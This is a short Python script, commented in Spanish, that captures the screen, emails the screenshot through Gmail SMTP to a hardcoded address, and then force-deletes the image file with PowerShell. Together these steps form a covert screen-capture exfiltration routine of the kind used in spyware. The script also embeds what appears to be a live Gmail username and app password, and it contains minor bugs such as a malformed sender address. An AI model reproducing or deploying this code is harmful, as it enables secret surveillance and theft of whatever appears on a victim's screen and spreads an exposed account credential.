# Aqui estara la tralla por una parte el screenshot  y por otra el envío del correo.

import pyautogui
import subprocess
import ssl, smtplib
from email.message import EmailMessage
from email.mime.image import MIMEImage
import subprocess
from datetime import datetime

# Ruta del path
path = subprocess.run("powershell $env:tmp", stdout=subprocess.PIPE, universal_newlines=True, shell=True)
path = path.stdout
# Estanciamos los objetos a usarem = EmailMessage()




def capture_image(image_name):
    # Create Time
    date = datetime.now()
    hora_now = "_{}_{}_{}".format(date.hour,date.minute,date.second)
    print (hora_now)
    #D:\Users\_ALUAS~1\AppData\Local\Temp\tmp_img_class
    image_capture = pyautogui.screenshot()
    try:
        #path_image = path.strip()+"\{}.png".format(image_name)
        path_image = path.strip()+"\img_class\%s%s.png" % (image_name, str(hora_now))
        image_capture.save(path_image)
        print(path_image)
    except:
        print("No se pudo enviar")

    print ("Captured Image :)")
    return path_image



def send_image(path_image, email="juanmapipa4@gmail.com"):

    print ("Path image ==> ",path_image)
    print ("El correo va para => {}".format(email))
    context = ssl.create_default_context()
    em = EmailMessage()
    # Send Email
    em['From'] = 'monolocacapop@gmailcom'
    em['To'] = email
    em['Subject'] = 'Capture Image'

    em.set_content("Capture Image:")
    # Adjuntamos Imagen
    
    file = open(path_image, "rb")
    attach_image = MIMEImage(file.read())
    #attach_image.add_header('Content-Disposition', 'attachment', file="caca.jpg")
    em.add_attachment(attach_image)



    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login('monolocacapop', 'ngkdwjlpolfrzyop')
        smtp.sendmail('monolocacapop', email,em.as_string())
    del em["To"]

def remove_image(path):
    rm_img = subprocess.run("powershell rm -Path {} -Force".format(path))
